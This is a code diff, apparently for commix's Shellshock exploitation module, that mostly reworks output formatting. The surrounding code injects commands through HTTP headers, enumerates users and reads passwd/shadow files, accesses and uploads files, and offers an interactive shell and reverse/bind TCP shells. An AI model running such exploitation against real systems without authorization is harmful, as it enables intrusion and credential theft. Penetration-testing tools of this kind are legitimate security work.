@@ -74,9 +74,8 @@ def enumeration(url, cve, check_header, filename):
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      info_msg = "The hostname is " +  str(shell)
-      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-      sys.stdout.flush()
+      info_msg = "The hostname is " +  str(shell) + "."
+      print(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file. 
       output_file = open(filename, "a")
       if not menu.options.no_logging:
@@ -104,9 +103,8 @@ def enumeration(url, cve, check_header, filename):
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if target_arch:
           info_msg = "The underlying operating system is " +  str(target_os) + Style.RESET_ALL  
-          info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
-          sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-          sys.stdout.flush()
+          info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)  + "."
+          print(settings.print_bold_info_msg(info_msg))
           # Add infos to logs file.   
           output_file = open(filename, "a")
           if not menu.options.no_logging:
@@ -115,9 +113,8 @@ def enumeration(url, cve, check_header, filename):
             output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
           output_file.close()
       else:
-        info_msg = "The underlying operating system is " +  target_os   
-        sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
-        sys.stdout.flush()
+        info_msg = "The underlying operating system is " +  target_os  + "."  
+        print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.    
         output_file = open(filename, "a")
         if not menu.options.no_logging:
@@ -150,29 +147,26 @@ def enumeration(url, cve, check_header, filename):
         output_file.close()
         if shell:
           if shell != "0":
-              sys.stdout.write(Style.BRIGHT + " and it is" +  " not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
-              sys.stdout.flush()
+              print(Style.BRIGHT + " and it is" + " not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".")
               # Add infos to logs file.   
               output_file = open(filename, "a")
               if not menu.options.no_logging:
                 output_file.write(" and it is not privileged.\n")
               output_file.close()
           else:
-            sys.stdout.write(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
-            sys.stdout.flush()
+            print(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".")
             # Add infos to logs file.   
             output_file = open(filename, "a")
             if not menu.options.no_logging:
               output_file.write(" and it is privileged.\n")
             output_file.close()
       else:
-        info_msg = "The current user is " +  str(cu_account)  
-        sys.stdout.write(settings.print_bold_info_msg(info_msg))
-        sys.stdout.flush()
+        info_msg = "The current user is " +  str(cu_account) + "."
+        print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.   
         output_file = open(filename, "a")
         if not menu.options.no_logging:
-          info_msg = "The current user is " + str(cu_account) + "\n"
+          info_msg = "The current user is " + str(cu_account) + ".\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
         output_file.close()  
     else:
@@ -203,7 +197,7 @@ def enumeration(url, cve, check_header, filename):
           sys.stdout.flush()
           warn_msg = "It seems that '" + settings.PASSWD_FILE 
           warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
-          print("\n" + settings.print_warning_msg(warn_msg)) 
+          print(settings.print_warning_msg(warn_msg)) 
           sys_users = " ".join(str(p) for p in sys_users).strip()
           print(sys_users)
           output_file = open(filename, "a")
@@ -218,9 +212,9 @@ def enumeration(url, cve, check_header, filename):
             sys.stdout.write(settings.SUCCESS_STATUS)
             info_msg = "Identified " + str(len(sys_users_list)) 
             info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-            info_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
-            sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
-            sys.stdout.flush()
+            info_msg += " in '" +  settings.PASSWD_FILE + "'."
+            print(settings.SINGLE_WHITESPACE)
+            print(settings.print_bold_info_msg(info_msg))
             # Add infos to logs file.   
             output_file = open(filename, "a")
             if not menu.options.no_logging:
@@ -283,7 +277,7 @@ def enumeration(url, cve, check_header, filename):
         sys.stdout.flush()
         warn_msg = "It seems that you don't have permissions to read the '" 
         warn_msg += settings.PASSWD_FILE + "'."
-        print("\n" + settings.print_warning_msg(warn_msg))   
+        print(settings.print_warning_msg(warn_msg))   
     except TypeError:
       sys.stdout.write(settings.FAIL_STATUS + "\n")
       sys.stdout.flush()
@@ -292,9 +286,8 @@ def enumeration(url, cve, check_header, filename):
     except IndexError:
       sys.stdout.write(settings.FAIL_STATUS)
       warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
-      warn_msg += settings.PASSWD_FILE + "'." 
-      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      warn_msg += settings.PASSWD_FILE + "'."
+      print(settings.print_warning_msg(warn_msg))
       pass
     settings.ENUMERATION_DONE = True
 
@@ -316,9 +309,9 @@ def enumeration(url, cve, check_header, filename):
         sys.stdout.write(settings.SUCCESS_STATUS)
         info_msg = "Identified " + str(len(sys_passes))
         info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-        info_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
-        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
-        sys.stdout.flush()
+        info_msg += " in '" +  settings.SHADOW_FILE + "'."
+        print(settings.SINGLE_WHITESPACE)
+        print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.   
         output_file = open(filename, "a")
         if not menu.options.no_logging:
@@ -368,7 +361,6 @@ def file_access(url, cve, check_header, filename):
     if not os.path.exists(file_to_write):
       warn_msg = "It seems that the provided local file '" + file_to_write + "', does not exist."
       print(settings.print_warning_msg(warn_msg))
-      print(settings.SINGLE_WHITESPACE)
       raise SystemExit()
       
     if os.path.isfile(file_to_write):
@@ -377,8 +369,7 @@ def file_access(url, cve, check_header, filename):
       content = "".join(str(p) for p in content).replace("'", "\"")
     else:
       warn_msg = "It seems that '" + file_to_write + "' is not a file."
-      sys.stdout.write(settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      print(settings.print_warning_msg(warn_msg))
     settings.FILE_ACCESS_DONE = True
 
     #-------------------------------
@@ -404,9 +395,8 @@ def file_access(url, cve, check_header, filename):
       print(settings.print_bold_info_msg(info_msg))
     else:
       warn_msg = "It seems that you don't have permissions to write the '"
-      warn_msg += dest_to_write + "' file." + "\n"
-      sys.stdout.write(settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      warn_msg += dest_to_write + "' file."
+      print(settings.print_warning_msg(warn_msg))
     settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
@@ -419,9 +409,8 @@ def file_access(url, cve, check_header, filename):
       _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as warn_msg:
       warn_msg = "It seems that the '" + file_to_upload + "' file, "
-      warn_msg += "does not exist. (" + str(warn_msg) + ")\n"
-      sys.stdout.write(settings.print_critical_msg(warn_msg))
-      sys.stdout.flush()
+      warn_msg += "does not exist. (" + str(warn_msg) + ")"
+      print(settings.print_critical_msg(warn_msg))
       raise SystemExit()
     except ValueError as err_msg:
       err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
@@ -451,9 +440,8 @@ def file_access(url, cve, check_header, filename):
       print(settings.print_bold_info_msg(info_msg))
     else:
       warn_msg = "It seems that you don't have permissions "
-      warn_msg += "to upload the '" + dest_to_upload + "' file.\n"
-      sys.stdout.write(settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      warn_msg += "to upload the '" + dest_to_upload + "' file."
+      print(settings.print_warning_msg(warn_msg))
     settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
@@ -477,23 +465,15 @@ def file_access(url, cve, check_header, filename):
       output_file.close()
     else:
       warn_msg = "It seems that you don't have permissions "
-      warn_msg += "to read the '" + file_to_read + "' file.\n"
-      sys.stdout.write(settings.print_warning_msg(warn_msg))
-      sys.stdout.flush()
+      warn_msg += "to read the '" + file_to_read + "' file."
+      print(settings.print_warning_msg(warn_msg))
     settings.FILE_ACCESS_DONE = True
-
-  if settings.FILE_ACCESS_DONE == True:
-    print(settings.SINGLE_WHITESPACE)
 
 """
 Execute the bind / reverse TCP shell
 """
 def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
-
   shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-  #if settings.VERBOSITY_LEVEL != 0:
-  #  print(settings.SINGLE_WHITESPACE)
-
   err_msg = "The " + os_shell_option.split("_")[0] + " "
   err_msg += os_shell_option.split("_")[1].upper() + " connection has failed."
   print(settings.print_critical_msg(err_msg))
@@ -566,7 +546,7 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
 """
 Check commix shell options
 """
-def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
+def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again,no_result):
 
   if os_shell_option == False:
     if no_result == True:
@@ -582,7 +562,8 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
   # The "os_shell" option
   elif os_shell_option == "os_shell": 
     warn_msg = "You are into the '" + os_shell_option + "' mode."
-    print(settings.print_warning_msg(warn_msg))+ "\n"
+    print(settings.print_warning_msg(warn_msg))
+    return go_back, go_back_again
 
   # The "bind_tcp" option
   elif os_shell_option == "bind_tcp":
@@ -631,7 +612,8 @@ def shellshock_handler(url, http_request_method, filename):
 
         # Check if defined "--verbose" option.
         if settings.VERBOSITY_LEVEL == 1:
-          sys.stdout.write("\n" + settings.print_payload(payload))
+          print(settings.SINGLE_WHITESPACE)
+          print(settings.print_payload(payload))
         elif settings.VERBOSITY_LEVEL >= 2:
           debug_msg = "Generating payload for the injection."
           print(settings.print_debug_msg(debug_msg))
@@ -691,8 +673,6 @@ def shellshock_handler(url, http_request_method, filename):
           logs.update_payload(filename, counter, payload) 
 
           if settings.VERBOSITY_LEVEL != 0:
-            if settings.VERBOSITY_LEVEL == 1:
-              print(settings.SINGLE_WHITESPACE)
             checks.total_of_requests()
 
           info_msg = "The (" + check_header + ") '"
@@ -705,9 +685,7 @@ def shellshock_handler(url, http_request_method, filename):
           print(settings.print_sub_content(sub_content))
 
           # Enumeration options.
-          if settings.ENUMERATION_DONE == True :
-            # if settings.VERBOSITY_LEVEL != 0:
-            #   print(settings.SINGLE_WHITESPACE)
+          if settings.ENUMERATION_DONE == True:
             while True:
               message = "Do you want to ignore stored session and enumerate again? [Y/n] > "
               enumerate_again = common.read_input(message, default="Y", check_batch=True)
@@ -726,7 +704,7 @@ def shellshock_handler(url, http_request_method, filename):
             enumeration(url, cve, check_header, filename)
 
           # File access options.
-          if settings.FILE_ACCESS_DONE == True :
+          if settings.FILE_ACCESS_DONE == True:
             while True:
               message = "Do you want to ignore stored session and access files again? [Y/n] > "
               file_access_again = common.read_input(message, default="Y", check_batch=True)
@@ -747,111 +725,119 @@ def shellshock_handler(url, http_request_method, filename):
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
             shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            # if settings.VERBOSITY_LEVEL <= 1:
-            #   print(settings.SINGLE_WHITESPACE)
-            print(settings.command_execution_output(shell))
-            raise SystemExit()
+            info_msg =  "Executing the user-supplied command '" + cmd + "'."
+            if shell:
+              print(settings.print_info_msg(info_msg))
+              print(settings.SINGLE_WHITESPACE)
+              print(settings.command_execution_output(shell))
+              print(settings.SINGLE_WHITESPACE)
+            else:
+              err_msg = "The '" + cmd + "' command, does not return any output."
+              print(settings.print_critical_msg(err_msg))
 
-          else:
-            # Pseudo-Terminal shell
-            print(settings.SINGLE_WHITESPACE)
-            go_back = False
-            go_back_again = False
-            while True:
-              if go_back == True:
-                break
-              message = "The identified injection point has been exploited. Do you want a pseudo-terminal shell? [Y/n] > "
-              if settings.IS_TTY:
-                gotshell = common.read_input(message, default="Y", check_batch=True)
-              else:
-                gotshell = common.read_input(message, default="n", check_batch=True)
-              if gotshell in settings.CHOICE_YES:
-                print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
-                if settings.READLINE_ERROR:
-                  checks.no_readline_module()
-                while True:
-                  try:
-                    if not settings.READLINE_ERROR:
-                      checks.tab_autocompleter()
-                    sys.stdout.write(settings.OS_SHELL)
-                    cmd = common.read_input(message="", default="os_shell", check_batch=True)
-                    cmd = checks.escaped_cmd(cmd)
-                    
-                    if cmd.lower() in settings.SHELL_OPTIONS:
-                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
-                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
-
-                      if go_back:
-                        break
-                    else: 
-                      shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-                      if shell != "":
-                        # Update logs with executed cmds and execution results.
-                        logs.executed_command(filename, cmd, shell)
-                        print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")
-                      else:
-                        debug_msg = "Executing the '" + cmd + "' command. "
-                        if settings.VERBOSITY_LEVEL == 1:
-                          sys.stdout.write(settings.print_debug_msg(debug_msg))
-                          sys.stdout.flush()
-                          sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
-                        elif settings.VERBOSITY_LEVEL >= 2:
-                          sys.stdout.write(settings.print_debug_msg(debug_msg))
-                          sys.stdout.flush()
-                          sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
-                        err_msg = "The '" + cmd + "' command, does not return any output."
-                        print(settings.print_critical_msg(err_msg))
-                        print(settings.SINGLE_WHITESPACE)
-
-                  except KeyboardInterrupt:
-                    raise
-
-                  except SystemExit:
-                    raise
-
-                  except EOFError:
-                    if not settings.IS_TTY:
-                      print(settings.SINGLE_WHITESPACE)
-                    err_msg = "Exiting, due to EOFError."
-                    print(settings.print_error_msg(err_msg))
-                    raise
-
-                  except TypeError:
-                    break
-                    
-              elif gotshell in settings.CHOICE_NO:
-                if checks.next_attack_vector(technique, go_back) == True:
-                  break
-                else:
-                  if no_result == True:
-                    return False 
-                  else:
-                    return True 
-
-              elif gotshell in settings.CHOICE_QUIT:
-                raise SystemExit()
-
-              else:
-                err_msg = "'" + gotshell + "' is not a valid answer."  
-                print(settings.print_error_msg(err_msg))
-                continue
+          # Pseudo-Terminal shell
+          go_back = False
+          go_back_again = False
+          while True:
+            if go_back == True:
               break
-        else:
-          continue
-          
-    if no_result:
-      if settings.VERBOSITY_LEVEL != 2:
-        print(settings.SINGLE_WHITESPACE)
+            message = "The identified injection point has been exploited. Do you want a pseudo-terminal shell? [Y/n] > "
+            if settings.IS_TTY:
+              gotshell = common.read_input(message, default="Y", check_batch=True)
+            else:
+              gotshell = common.read_input(message, default="n", check_batch=True)
+            if gotshell in settings.CHOICE_YES:
+              print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
+              if settings.READLINE_ERROR:
+                checks.no_readline_module()
+              while True:
+                try:
+                  if not settings.READLINE_ERROR:
+                    checks.tab_autocompleter()
+                  sys.stdout.write(settings.OS_SHELL)
+                  cmd = common.read_input(message="", default="os_shell", check_batch=True)
+                  cmd = checks.escaped_cmd(cmd)
+                  if cmd.lower() in settings.SHELL_OPTIONS:
+                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
+                    if os_shell_option is not False:
+                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again, no_result)
+                      if go_back and go_back_again == False:
+                        break
+                    else:
+                      logs.logs_notification(filename)
+                      return True
+                  else: 
+                    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+                    if shell != "":
+                      # Update logs with executed cmds and execution results.
+                      logs.executed_command(filename, cmd, shell)
+                      print(settings.SINGLE_WHITESPACE)
+                      print(Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL)
+                      print(settings.SINGLE_WHITESPACE)
+                    else:
+                      debug_msg = "Executing the '" + cmd + "' command. "
+                      if settings.VERBOSITY_LEVEL == 1:
+                        print(settings.print_debug_msg(debug_msg))
+                        print(settings.SINGLE_WHITESPACE)
+                        print(settings.print_payload(payload))
+                        print(settings.SINGLE_WHITESPACE)
+                      elif settings.VERBOSITY_LEVEL >= 2:
+                        print(settings.print_debug_msg(debug_msg))
+                        print(settings.SINGLE_WHITESPACE)
+                        sys.stdout.write(settings.print_payload(payload))
+                        print(settings.SINGLE_WHITESPACE)
+                      err_msg = "The '" + cmd + "' command, does not return any output."
+                      print(settings.print_critical_msg(err_msg))
+                      print(settings.SINGLE_WHITESPACE)
+
+                except KeyboardInterrupt:
+                  raise
+
+                except SystemExit:
+                  raise
+
+                except EOFError:
+                  if not settings.IS_TTY:
+                    print(settings.SINGLE_WHITESPACE)
+                  err_msg = "Exiting, due to EOFError."
+                  print(settings.print_error_msg(err_msg))
+                  raise
+
+                except TypeError:
+                  break
+                  
+            elif gotshell in settings.CHOICE_NO:
+              if checks.next_attack_vector(technique, go_back) == True:
+                break
+              else:
+                if no_result == True:
+                  return False 
+                else:
+                  logs.logs_notification(filename)
+                  return True
+            elif gotshell in settings.CHOICE_QUIT:
+              raise SystemExit()
+            else:
+              err_msg = "'" + gotshell + "' is not a valid answer."  
+              print(settings.print_error_msg(err_msg))
+              continue
+            break
+
+    if no_result == True:
+      print(settings.SINGLE_WHITESPACE)
       err_msg = "All tested HTTP headers appear to be not injectable."
       print(settings.print_critical_msg(err_msg))
       raise SystemExit()
-      
+    else:
+      logs.logs_notification(filename)
+            
   except _urllib.error.HTTPError as err_msg:
     if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
       response = False  
     elif settings.IGNORE_ERR_MSG == False:
       err = str(err_msg) + "."
-      print("\n" + settings.print_critical_msg(err))
+      print(settings.SINGLE_WHITESPACE)
+      print(settings.print_critical_msg(err))
       continue_tests = checks.continue_tests(err_msg)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
@@ -880,7 +866,6 @@ def cmd_exec(url, cmd, cve, check_header, filename):
   """
   def check_for_shell(url, cmd, cve, check_header, filename):
     try:
-
       TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
       cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
       payload = shellshock_exploitation(cve, cmd)
@@ -889,7 +874,9 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         sys.stdout.write(settings.print_debug_msg(debug_msg))
       sys.stdout.flush()
       if settings.VERBOSITY_LEVEL != 0:
-        sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
+        print(settings.SINGLE_WHITESPACE)
+        print(settings.print_payload(payload))
+        print(settings.SINGLE_WHITESPACE)
 
       header = {check_header : payload}
       request = _urllib.request.Request(url, None, header)
@@ -913,7 +900,8 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       return shell, payload
 
     except _urllib.error.URLError as err_msg:
-      print("\n" + settings.print_critical_msg(err_msg))
+      print(settings.SINGLE_WHITESPACE)
+      print(settings.print_critical_msg(err_msg))
       raise SystemExit()
 
   shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
